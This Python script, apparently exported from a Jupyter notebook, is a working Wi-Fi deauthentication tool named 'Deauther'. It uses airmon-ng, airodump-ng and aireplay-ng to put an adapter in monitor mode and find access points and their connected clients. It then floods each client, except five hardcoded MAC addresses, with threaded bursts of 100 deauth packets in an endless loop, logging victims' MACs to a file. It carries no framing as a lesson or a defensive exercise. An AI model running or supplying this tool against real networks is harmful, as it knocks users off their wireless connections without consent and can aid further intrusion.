#!/usr/bin/env python
# coding: utf-8

# In[ ]:


import csv
import subprocess
import random
import threading
import time
from os.path import exists




#pa = input("Output Path : ")
#bssid = "E0:63:DA:BD:F4:23"
bssidFindSec = 15

#List of ignore
ignore = [
    'C2:25:2F:09:9E:0E',
    '64:DD:E9:D8:23:A9',
    'E0:1F:88:F9:91:3F',
    '20:F4:78:D7:53:A1',
    '1C:CC:D6:94:FB:1B'
    ]


fileNum = input(f'[*] File Number (int) {"":16}: ')
print()

fileName = "Deauther"
if not exists(fileName):
	subprocess.call(["mkdir",fileName])
    
csvFilename = f"client{fileNum}"
path = f"{fileName}/{csvFilename}"
path1 = f"{fileName}/{csvFilename+'bssid'}"
s = subprocess.check_output(["iwconfig"],stderr=subprocess.STDOUT)
inf = []
for j in s.splitlines():
    jj = j.decode("utf-8")
    if jj != '':
        if jj[0] != ' ':
            inf.append(jj.split()[0])
for ii,i in enumerate(inf):print(f"[{ii}] {i}",end="\n")
interface = inf[int(input(f"\n{'[*] Input Adapter Index Number (int) ':31} : "))]#"wlx2887ba493096"#"wlx2887baafa69e"


delay = int(input(f"\n{'[*] Delay Scanning( While Attacking )':31} : "))





lisa = []

def kill(interface):
    subprocess.call(["airmon-ng","check","kill"],stdout=subprocess.DEVNULL,stderr=subprocess.STDOUT)

    subprocess.call(["airmon-ng","start",interface],stdout=subprocess.DEVNULL,stderr=subprocess.STDOUT)
    print(f"[*] {interface} is Moniter Mode On.\n")

    
def createFile(delay,interface,bssid,path):
    
    if bssid != '':
        subprocess.call(["rm",f"{fileName}/client{fileNum}-01.csv"],stdout=subprocess.DEVNULL,stderr=subprocess.STDOUT)
        subprocess.call(["timeout","--foreground",f"{delay}s","airodump-ng",interface,"--bssid",bssid,"-w",path,"-o","csv"],stdout=subprocess.DEVNULL,stderr=subprocess.STDOUT)
    else:
        subprocess.call(["rm",f"{fileName}/client{fileNum}bssid-01.csv"],stdout=subprocess.DEVNULL,stderr=subprocess.STDOUT)
        print("[*] Finding BSSID...")
        subprocess.call(["timeout","--foreground",f"{bssidFindSec}s","airodump-ng",interface,"-w",path,"-o","csv"],stdout=subprocess.DEVNULL,stderr=subprocess.STDOUT)
        
    
def deauth(interface,channel,bssid,station,pkg):
    global lisa
    subprocess.call(["airmon-ng","start",interface,f"{channel}"],stdout=subprocess.DEVNULL,stderr=subprocess.STDOUT)
    subprocess.call(["aireplay-ng","-0",f"{pkg}","-a",bssid,"-c",station,interface],stdout=subprocess.DEVNULL,stderr=subprocess.STDOUT)
    lisa.remove(station)
    
def readFile():
    lis = []
    with open(f"{fileName}/client{fileNum}-01.csv",newline='') as csvFile:
        reader = csv.reader(csvFile)
        for i in reader:
            lis.append(i)

    lis1 = lis[4:]
    lisOfstation = []
    for i in lis1[1:]:
        if i == []:
            pass
        else:
            lisOfstation.append(i[0])
    channel = int(lis[2][3])
    return lisOfstation,channel
def apFind():
    print()
    createFile(delay,interface,'',path1)
    lis = []
    with open(f"{fileName}/client{fileNum}bssid-01.csv",newline='') as csvFile:
        reader = csv.reader(csvFile)
        for i in reader:
            lis.append(i)
    liss = []
    for ii,i in enumerate(lis[2:]):
        if i != []:
            bssid = i[0]
            channel = i[3]
            essid = i[13]
            print(f"[{ii:02}] ESSID : {essid:15} BSSID : {bssid:20} CHANNEL : {channel}")
            liss.append(bssid)
        else:
            break
    try:
        return liss[int(input(f"\n[*] If YOU DO NOT FIND Press (ENTER).\n{'[*] Please Input Index (int) ':31} : "))]
    except Exception:
        print("[*] Let Find Again...\n")
        apFind()

def threadDeauth(interface,channel,bssid,station,pkg):
    thread = threading.Thread(target=deauth,args=(interface,channel,bssid,station,pkg))
    thread.deamon = True
    thread.start()
    
sta = input(f"\n[*] Do you want to start Moniter Mode?\n[*] If u already on choose (n).\n{'[*] Input Here (y or n) ':37} : ")
print()
if sta == 'y':
    kill(interface)
else:
    pass

bssid = apFind() if input(f"{'[*] Do U have BSSID?(y or n)':37} : ").lower() == 'n' else input(f"{'BSSID Here':31} : ")
print(f"{'[*] BSSID':31} : {bssid}")

while 1:
    print()
    print("Let Start...")
    t1 = time.time()
    createFile(delay,interface,bssid,path)
    t2 = time.time()
    totalTime = t2 - t1
    print(f"Takin File Duration {int(totalTime)}s")
    lisOfstation,channel = readFile()

    for station in lisOfstation:
        if station in ignore:
            continue
        pkg = 100 # 100 package
        if station not in lisa:
            print(f"{'Start Attack To Station':25} : {station} Channel : {channel}.")
            threadDeauth(interface,channel,bssid,station,pkg)
            lisa.append(station)
            with open("MAC.txt","r") as r:
                if station+"\n" not in r.readlines():
                    with open("MAC.txt",'a') as a:
                        a.write(f"{station}\n")
        else:
              print(f"{'Still Attacking Sation':25} : {station}...")
# In[ ]:





